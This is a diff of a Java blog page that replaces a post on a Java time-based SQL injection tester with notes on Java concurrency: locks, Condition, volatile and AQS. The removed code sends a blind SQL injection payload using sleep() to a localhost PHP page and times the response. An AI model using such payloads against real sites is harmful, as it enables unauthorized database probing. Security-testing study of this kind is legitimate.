@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Java简单延时注入程序, Java,麦当,Spring,Java面试,Springboot,开发经验,技术分享,web安全">
+    <meta name="keywords" content="AQS及Java中的多种锁机制, Java,麦当,Spring,Java面试,Springboot,开发经验,技术分享,web安全">
     <meta name="description" content="一个成熟的可以自己写文和发布的可爱小程序！">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Java简单延时注入程序 | 知晓</title>
+    <title>AQS及Java中的多种锁机制 | 知晓</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -245,12 +245,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Java简单延时注入程序</h1>
+                    <h1 class="description center-align post-title">AQS及Java中的多种锁机制</h1>
                 </div>
             </div>
         </div>
@@ -367,8 +367,16 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E7%BC%96%E5%86%99/">
-                                <span class="chip bg-color">安全工具编写</span>
+                            <a href="/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/">
+                                <span class="chip bg-color">多线程</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/">
+                                <span class="chip bg-color">并发编程</span>
+                            </a>
+                        
+                            <a href="/tags/synchronize%E9%94%81%E5%8D%87%E7%BA%A7/">
+                                <span class="chip bg-color">synchronize锁升级</span>
                             </a>
                         
                     </div>
@@ -379,12 +387,16 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
-                                web安全
+                            <a href="/categories/%E5%A4%9A%E7%BA%BF%E7%A8%8B/" class="post-category">
+                                多线程
                             </a>
                         
-                            <a href="/categories/web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/" class="post-category">
-                                安全工具
+                            <a href="/categories/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E5%B9%B6%E5%8F%91/" class="post-category">
+                                并发
+                            </a>
+                        
+                            <a href="/categories/%E5%A4%9A%E7%BA%BF%E7%A8%8B/%E5%B9%B6%E5%8F%91/QAS/" class="post-category">
+                                QAS
                             </a>
                         
                     </div>
@@ -396,7 +408,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-05-24
+                    2020-05-27
                 </div>
                 
 
@@ -412,53 +424,235 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <pre><code>package com.secsail;
+                <h2 id="并发编程的优点和缺点"><a href="#并发编程的优点和缺点" class="headerlink" title="并发编程的优点和缺点"></a>并发编程的优点和缺点</h2><p>优点：</p>
+<p><strong>提升性能</strong></p>
+<p>将多核CPU的计算能力发挥到机制，性能得到提升</p>
+<p><strong>业务适用</strong></p>
+<p>并行计算会比串行计算更适应业务需求，而并发编程更适用于该模型</p>
+<p>缺点：</p>
+<p><strong>频繁上线文切换</strong></p>
+<p>前提是：线程数量 &gt; CPU核数</p>
+<p><strong>线程安全</strong></p>
+<p><strong>数据的可见性、原子性、有序性</strong></p>
+<p>无锁并发编程</p>
+<h2 id="Runnable和Callable的区别"><a href="#Runnable和Callable的区别" class="headerlink" title="Runnable和Callable的区别"></a>Runnable和Callable的区别</h2><ul>
+<li>Runnable从JDK1.1就有了，而Callble是JDK1.5之后增加的</li>
+<li>Callable执行方法是call()，Runnable执行方法是run()</li>
+<li>Callable任务执行后可返回值，而Runnable任务是不能返回值(void)</li>
+<li>call方法可以抛出异常，run方法不可以</li>
+<li>运行Callable任务可拿到Future对象，即异步计算结果：<ul>
+<li>它提供了检查计算是否完成的方法，以等待计算的完成，并检索计算的结果</li>
+<li>通过Future对象可以了解任务执行情况，可取消任务的执行，还可以获取执行结果</li>
+</ul>
+</li>
+<li>使用线程池方式运行：</li>
+<li>Runnable用ExecutorService的execute方法</li>
+<li>Callable使用submit方法</li>
+</ul>
+<h2 id="为什么使用锁"><a href="#为什么使用锁" class="headerlink" title="为什么使用锁"></a>为什么使用锁</h2><p>并发操作同一资源</p>
+<p>资源竞争、保护</p>
+<p>资源胡钗</p>
+<p>并发编程的产生</p>
+<h2 id="Java中锁的种类"><a href="#Java中锁的种类" class="headerlink" title="Java中锁的种类"></a>Java中锁的种类</h2><ul>
+<li>synchronized<ul>
+<li>synchronized关键字，语义层面的定义及使用</li>
+<li>隐式地获取锁，将锁的获取和释放固化，即先获取在释放当前锁</li>
+</ul>
+</li>
+<li>Lock（JDK1.5）</li>
+<li>对比：<ul>
+<li>非阻塞方式获取锁</li>
+<li>获取锁喉可被中断</li>
+<li>获取锁设置超时机制</li>
+</ul>
+</li>
+</ul>
+<h3 id="synchronize的用法"><a href="#synchronize的用法" class="headerlink" title="synchronize的用法"></a>synchronize的用法</h3><p><img src="https://upload-images.jianshu.io/upload_images/21601015-7f10a14e0ba5e0b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="synchronize的用法.png"></p>
+<h3 id="Java对象的组成"><a href="#Java对象的组成" class="headerlink" title="Java对象的组成"></a>Java对象的组成</h3><p><img src="https://upload-images.jianshu.io/upload_images/21601015-8a2cf088a9ff98fa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Java对象的组成.png"></p>
+<h3 id="synchronize-锁升级"><a href="#synchronize-锁升级" class="headerlink" title="synchronize 锁升级"></a>synchronize 锁升级</h3><p>偏向锁即有一个线程A访问带有锁的同步代码块时，会在对象头的mark word记录线程的ID，当有线程访问同步块时，会比较mark word中的线程id，和当前线程是否一致，如果还是线程A则直接获取到锁，当有一个B访问时，会尝试CAS将对象头中的mark wor替换为指向锁记录指针，如果替换成功，则当前线程获得到锁，如果替换失败则说明有其他线程在竞争锁，当前线程使用自旋来获取锁，当自旋次数达到一定次数时，就会升级成为重量级锁，由操作系统Mutexlock实现线程间的切换</p>
+<p><strong>轻量锁就是偏向锁+自旋</strong></p>
+<p>​    自旋的次数可以用个jvm参数设置，但是在jdk1.7之后，就不建议修改这个参数了，因为程序进行了优化，锁自动优化，锁弹性升级，它自动判断大部分情况需要多少自旋次数能解决问题，不断升级自旋次数</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21601015-9b3d1a74ffebc61a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="synchronize 锁升级.png"></p>
+<h2 id="Lock"><a href="#Lock" class="headerlink" title="Lock"></a>Lock</h2><ul>
+<li>Lock概念<ul>
+<li>是一个接口，它定义和规范了”获取和释放锁”，Lock接口的实现基本都是<strong>通过聚合了一个同步器的子类</strong>来完成线程访问控制的</li>
+</ul>
+</li>
+<li>Lock接口方法<ul>
+<li>lock() 获取锁</li>
+<li>lockInterruptibly() 可中断地进行获取锁</li>
+<li>tryLock() 非阻塞地尝试获取锁</li>
+<li>tryLock(long time, TimeUnit unit) 有超时时间获取锁</li>
+<li>unlock() 释放锁</li>
+<li>Condition newCondition获取等待通知组件，该组件与当前锁绑定，只有当前线程获取锁才可以使用组件await()，await()调用后释放锁</li>
+</ul>
+</li>
+</ul>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>TimeUnit<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span>Condition<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span>Lock<span class="token punctuation">;</span>
 
-import java.io.IOException;
-import java.net.URLEncoder;
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestLock</span> <span class="token keyword">implements</span> <span class="token class-name">Lock</span> <span class="token punctuation">{</span>
+    <span class="token comment" spellcheck="true">// 获取锁</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 
-import org.apache.http.HttpEntity;
-import org.apache.http.client.ClientProtocolException;
-import org.apache.http.client.methods.CloseableHttpResponse;
-import org.apache.http.client.methods.HttpGet;
-import org.apache.http.impl.client.CloseableHttpClient;
-import org.apache.http.impl.client.HttpClientBuilder;
-import org.apache.http.util.EntityUtils;
+    <span class="token punctuation">}</span>
 
-public class Main {
-    public static void main(String[] args) throws ClientProtocolException, IOException {
-        long starTime = System.currentTimeMillis();
-        String payload = URLEncoder.encode(&quot;if(length(database())&gt;=9,sleep(5),sleep(0))&quot;, &quot;utf-8&quot;);
-        // 开启debug调试
-//        System.setProperty(&quot;org.apache.commons.logging.Log&quot;, &quot;org.apache.commons.logging.impl.SimpleLog&quot;);
-//        System.setProperty(&quot;org.apache.commons.logging.simplelog.showdatetime&quot;, &quot;true&quot;);
-//        System.setProperty(&quot;org.apache.commons.logging.simplelog.log.org.apache.http&quot;, &quot;debug&quot;);
+    <span class="token comment" spellcheck="true">// 可中断地进行获取锁</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">lockInterruptibly</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException <span class="token punctuation">{</span>
 
-        CloseableHttpClient httpClient = HttpClientBuilder.create().build();
-        HttpGet httpGet = new HttpGet(&quot;http://localhost/sql.php?id=&quot;+payload);
-        CloseableHttpResponse response = httpClient.execute(httpGet);
-        HttpEntity entity = response.getEntity();
-        String text = EntityUtils.toString(entity, &quot;UTF-8&quot;);
-        System.out.println(text);
+    <span class="token punctuation">}</span>
 
-        if (response != null) {
-            response.close();
-        }
-        if (httpClient != null) {
-            httpClient.close();
-        }
+    <span class="token comment" spellcheck="true">// 非阻塞地尝试获取锁</span>
+    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">tryLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
 
-        long endTime = System.currentTimeMillis();
-        double responseTime = ((endTime - starTime) /1000d);
+    <span class="token comment" spellcheck="true">// 有超时时间获取锁</span>
+    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">tryLock</span><span class="token punctuation">(</span><span class="token keyword">long</span> time<span class="token punctuation">,</span> TimeUnit unit<span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
 
-        if (responseTime &gt; 5d) {
-            System.out.println(&quot;延时注入&quot;);
-        }
+    <span class="token comment" spellcheck="true">// 释放锁</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 
-        System.out.println(&quot;+=用时：&quot;+((endTime - starTime) /1000d) +&quot;秒&quot;);
-    }
-}
+    <span class="token punctuation">}</span>
+
+    <span class="token comment" spellcheck="true">// 获取等待通知组件，该组件与当前锁绑定，只有当前线程获取锁才可以使用组件await()，await()调用后释放锁</span>
+    <span class="token keyword">public</span> Condition <span class="token function">newCondition</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> null<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
 </code></pre>
+<h2 id="Condition"><a href="#Condition" class="headerlink" title="Condition"></a>Condition</h2><ul>
+<li><p>*<em>await(): *</em>造成当前线程在接收到信号或被中断之前一直处于等待状态。</p>
+</li>
+<li><p>*<em>await(long time, TimeUnit unit): *</em>造成当前线程在接收到信号、被中断或达到指定等待时间之前一直处于等待状态。</p>
+</li>
+<li><p>*<em>long awaitNanos(long nanosTimeout): *</em>造成当前线程在接收到信号、被中断或达到指定等待时间之前一直处于等待状态。返回值表示剩余时间，如果在nanosTimeout之前唤醒，那么返回值= nanosTimeout - 消耗时间，如果返回值 &lt;= 0，则可以认定它已经超时了。</p>
+</li>
+<li><p>*<em>awaitUninterruptibly(): *</em>造成当前线程在接收到信号之前一直处于等待状态。</p>
+<ul>
+<li>注意：该方法对中断不敏感。</li>
+</ul>
+</li>
+<li><p>*<em>boolean awaitUntil(Date deadline): *</em>造成当前线程在接收到信号、被中断或到达指定最后期限之前一直处于等待状态。如果没有到指定时间就被通知，则返回true，否则表示到了指定时间，返回false。</p>
+</li>
+<li><p>*<em>void signal(): *</em>唤醒一个等待线程。该线程从等待放放返回前必须获得与Condition相关的锁。</p>
+</li>
+<li><p>*<em>void signalAll(): *</em>唤醒所有等待线程，能够从等待放放返回的线程，必须获取与Condition相关的锁</p>
+</li>
+</ul>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span>Condition<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span>ReentrantLock<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestCondition</span> <span class="token punctuation">{</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+
+        <span class="token keyword">final</span> ReentrantLock reentrantLock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReentrantLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">final</span> Condition condition <span class="token operator">=</span> reentrantLock<span class="token punctuation">.</span><span class="token function">newCondition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>
+
+            reentrantLock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"拿到了锁"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"等待信号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                condition<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"拿到信号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            reentrantLock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"线程1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>
+
+            reentrantLock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"拿到了锁"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"发出信号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            condition<span class="token punctuation">.</span><span class="token function">signalAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            reentrantLock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"线程2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span>
+</code></pre>
+<h2 id="AQS-队列同步器"><a href="#AQS-队列同步器" class="headerlink" title="AQS 队列同步器"></a>AQS 队列同步器</h2><ul>
+<li>AQS：AbstractQueuedSynchronizer 队列同步器</li>
+<li>用来构建锁或者其他同步组件的基础框架</li>
+<li>用int成员变量表示同步状态</li>
+<li>通过内置的FIFO（先进先出）队列来完成资源获取线程的排队工作</li>
+<li>大部分同步需求的基础</li>
+<li>同步状态：<ul>
+<li>getState()</li>
+<li>setSate(int newState)</li>
+<li>compareAndSetState(int expect, int update)</li>
+</ul>
+</li>
+<li>锁是面向使用者的，它定义了使用者与锁交互的接口（比如可以允许两个线程并行访问），隐藏了实现细节</li>
+<li>同步器（AQS）面向的是锁的创造者OR开发者，它提供了便捷的工具和方法，将同步状态，线程排队，等待及唤醒等底层操作封装起来，让开发者使用更便捷</li>
+<li>锁和同步器很多地隔离了使用者和实现者所需关注的范围及各自关注的逻辑细节</li>
+</ul>
+<h2 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h2><ul>
+<li>保证不同线程对统一变量操作时的可见性</li>
+<li>禁止指令重排序</li>
+</ul>
+<h2 id="MESI协议"><a href="#MESI协议" class="headerlink" title="MESI协议"></a>MESI协议</h2><ul>
+<li>将当前处理器缓存行的数据写会系统内存</li>
+<li>这个写回内存的操作会使其他CPU里缓存了该内存地址的数据无效</li>
+<li>volatile下的MESI：<ul>
+<li>Lock前缀的指令会引起处理器缓存写回内存</li>
+<li>一个处理器的缓存回写到内存会导致其他处理器的缓存失效</li>
+<li>当处理器发现本地缓存失效后，就会从内存中重读该变量数据，既可以获取当前最新值</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/21601015-4448da400030cb30.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="MESI协议.png"></p>
+<h2 id="AQS实现原理"><a href="#AQS实现原理" class="headerlink" title="AQS实现原理"></a>AQS实现原理</h2><ul>
+<li>同步器依赖内部的队列完成同步状态的管理，当线程获取同步状态失败时，同步器会将当前线程与等待状态等信息构造成为一个节点（Node）将其放入同步队列，同时会阻塞当前线程。同步状态释放时，唤醒首节点中的线程，使其再次尝试获取同步状态，</li>
+<li>主要包括：<ul>
+<li>同步队列</li>
+<li>独占式同步状态获取与释放</li>
+<li>共享式同步状态获取与释放</li>
+<li>超时获取同步状态等同步器的核心数据结构与模板方法</li>
+</ul>
+</li>
+</ul>
+<h3 id="同步队列"><a href="#同步队列" class="headerlink" title="同步队列"></a>同步队列</h3><ul>
+<li><p>同步队列中的节点（Node）:</p>
+<ul>
+<li>保存获取同步状态失败线程的引用，等待状态以及前置和后置节点</li>
+</ul>
+</li>
+<li><p>包含的字段：</p>
+<ul>
+<li>prev 前置节点</li>
+<li>next 后置节点</li>
+<li>thread 获取同步状态的线程</li>
+<li>waitStatus 等待状态</li>
+<li>nextWaiter 等待队列中的后置节点</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/21601015-251190d7d6e72ac3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="AQS同步队列.png"></p>
+</li>
+</ul>
+
             </div>
             <hr/>
 
@@ -483,7 +677,7 @@ public class Main {
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://javaknow.org/2020/05/24/java-jian-dan-yan-shi-zhu-ru-cheng-xu/">http://javaknow.org/2020/05/24/java-jian-dan-yan-shi-zhu-ru-cheng-xu/</a>
+                    <a href="http://javaknow.org/2020/05/27/aqs-ji-java-zhong-de-duo-chong-suo-ji-zhi/">http://javaknow.org/2020/05/27/aqs-ji-java-zhong-de-duo-chong-suo-ji-zhi/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -521,8 +715,16 @@ public class Main {
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E7%BC%96%E5%86%99/">
-                                    <span class="chip bg-color">安全工具编写</span>
+                                <a href="/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/">
+                                    <span class="chip bg-color">多线程</span>
+                                </a>
+                            
+                                <a href="/tags/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/">
+                                    <span class="chip bg-color">并发编程</span>
+                                </a>
+                            
+                                <a href="/tags/synchronize%E9%94%81%E5%8D%87%E7%BA%A7/">
+                                    <span class="chip bg-color">synchronize锁升级</span>
                                 </a>
                             
                         </div>
@@ -564,9 +766,10 @@ public class Main {
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2020/05/27/aqs-ji-java-zhong-de-duo-chong-suo-ji-zhi/">
                     <div class="card-image">
@@ -593,9 +796,9 @@ public class Main {
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-05-27
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-27
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -616,6 +819,7 @@ public class Main {
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -642,34 +846,25 @@ public class Main {
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/05/24/docker-chang-yong-cao-zuo/">
+                <a href="/2020/05/24/java-jian-dan-yan-shi-zhu-ru-cheng-xu/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="docker 常用操作">
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="Java简单延时注入程序">
                         
-                        <span class="card-title">docker 常用操作</span>
+                        <span class="card-title">Java简单延时注入程序</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            1、镜像操作
+                            package com.secsail;
 
+import java.io.IOException;
+import java.net.URLEncoder;
 
-操作
-命令
-说明
-
-
-
-检索
-docker search 关键字eg: docker search mysql
-我们经常去docker hub上检索镜像的详细，如镜像的TAG(版本)。
-
-
-拉取
-docker pull 镜
+import org.apache.http.HttpEntity;
+import
                         
                     </div>
                     <div class="publish-info">
@@ -680,8 +875,12 @@ docker pull 镜
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/docker/" class="post-category">
-                                    docker
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    web安全
+                                </a>
+                            
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/" class="post-category">
+                                    安全工具
                                 </a>
                             
                             
@@ -691,8 +890,8 @@ docker pull 镜
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/docker%E5%9F%BA%E7%A1%80/">
-                        <span class="chip bg-color">docker基础</span>
+                    <a href="/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E7%BC%96%E5%86%99/">
+                        <span class="chip bg-color">安全工具编写</span>
                     </a>
                     
                 </div>
